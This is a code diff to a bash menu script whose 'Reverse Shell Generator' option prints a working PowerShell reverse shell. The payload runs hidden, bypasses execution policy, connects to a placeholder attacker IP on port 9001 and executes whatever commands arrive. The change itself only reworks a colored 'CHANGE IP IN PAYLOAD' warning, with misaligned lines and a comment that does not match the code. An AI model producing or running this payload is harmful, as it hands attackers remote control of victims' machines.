@@ -12,7 +12,11 @@ do
         "Reverse Shell Generator")
             clear
             echo powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('yourip', 9001);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"
-            \033[31mCHANGE IP IN PAYLOAD\033[00m
+            red_prefix="\033[31m"
+red_suffix="\033[00m"
+
+# wrap the string "ERROR" with the prefix and suffix
+echo -e "$red_prefix"CHANGE IP IN PAYLOAD"$red_suffix"
             read -p "Press [Enter] key to start backup..."
             ;;
         "Quit")
